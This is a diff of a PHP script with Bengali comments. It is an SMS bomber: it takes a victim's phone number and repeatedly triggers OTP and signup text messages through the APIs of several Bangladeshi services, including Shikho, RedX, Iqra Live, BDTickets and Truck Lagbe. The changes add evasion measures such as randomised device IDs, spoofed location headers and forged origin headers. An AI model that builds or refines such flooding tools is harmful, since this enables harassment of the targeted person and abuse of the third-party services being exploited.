@@ -2,7 +2,6 @@
 header('Content-Type: application/json');
 set_time_limit(0); 
 
-// ১. ফোন নাম্বার চেক ও ফরম্যাটিং
 if(!isset($_GET['phone']) || empty($_GET['phone'])){
     echo json_encode(["status" => "error", "message" => "Phone number missing"]);
     exit;
@@ -15,7 +14,7 @@ $phone_plus88 = "+88" . $phone_11;
 
 $responses = [];
 
-// ২. কমন CURL ফাংশন (কোড ক্লিন রাখার জন্য)
+// কমন CURL ফাংশন
 function send_sms($url, $method = 'GET', $data = null, $headers = [], $timeout = 30) {
     $ch = curl_init();
     curl_setopt_array($ch, [
@@ -36,10 +35,10 @@ function send_sms($url, $method = 'GET', $data = null, $headers = [], $timeout =
     return json_decode($res, true) ?: $res;
 }
 
-// --- সার্ভিস লিস্ট শুরু ---
-
-// ১. Shikho
-$responses["shikho"] = send_sms('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"], ['Content-Type: application/json', 'User-Agent: Mozilla/5.0']);
+// ১. Shikho - ফিক্সড হেডার ও ডাইনামিক আইডি
+$responses["shikho"] = send_sms('https://api.shikho.com/auth/v2/send/sms', 'POST', 
+    ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"], 
+    ['Content-Type: application/json', 'User-Agent: Mozilla/5.0', 'x-device-id: ' . bin2hex(random_bytes(16))]);
 sleep(2);
 
 // ২. RedX
@@ -56,39 +55,29 @@ for($i=1; $i<=2; $i++){
 
 // ৪. Iqra Live
 for($i=1; $i<=2; $i++){
-    $responses["iqra_$i"] = send_sms("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', null, [
-        'User-Agent: Mozilla/5.0 (Linux; Android 10; Mobile)',
-        'Origin: https://iqra-live.com',
-        'Referer: https://iqra-live.com/'
-    ]);
+    $responses["iqra_$i"] = send_sms("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', null, ['User-Agent: Mozilla/5.0', 'Origin: https://iqra-live.com']);
     sleep(2);
 }
 
 // ৫. BDTickets
 for($i=1; $i<=2; $i++){
-    $responses["bdtickets_$i"] = send_sms('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], [
-        'Content-Type: application/json',
-        'origin: https://bdtickets.com',
-        'referer: https://bdtickets.com/'
-    ]);
+    $responses["bdtickets_$i"] = send_sms('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], ['Content-Type: application/json', 'origin: https://bdtickets.com']);
     sleep(2);
 }
 
-// ৬. Truck Lagbe - আপনার নতুন এবং উন্নত কোড (৩ বার লুপ)
+// ৬. Truck Lagbe - ফিক্সড লোকেশন ও ডিভাইস আইডি
 for($i=1; $i<=3; $i++){
-    // ডাইনামিক ডিভাইস আইডি জেনারেশন
     $deviceId = rand(100,999) . "." . rand(10,99) . "." . rand(100,999) . time();
-    
     $responses["truck_lagbe_$i"] = send_sms(
         'https://tethys.trucklagbe.com/tl_gateway/tl_login/128/loginWithPhoneNo',
         'POST',
         ["userType" => "shipper", "phoneNo" => $phone_11],
         [
             'User-Agent: Mozilla/5.0 (Linux; Android 10; Mobile)',
-            'Accept: application/json, text/plain, */*',
             'Content-Type: application/json',
             'deviceId: '.$deviceId,
-            'source: website',
+            'lat: 23.8103', 
+            'lng: 90.4125',
             'Origin: https://trucklagbe.com',
             'Referer: https://trucklagbe.com/'
         ]
@@ -96,10 +85,5 @@ for($i=1; $i<=3; $i++){
     sleep(2);
 }
 
-// ফাইনাল আউটপুট
-echo json_encode([
-    "status" => "success",
-    "target" => $phone,
-    "results" => $responses
-], JSON_PRETTY_PRINT);
+echo json_encode(["status" => "success", "results" => $responses], JSON_PRETTY_PRINT);
 ?>
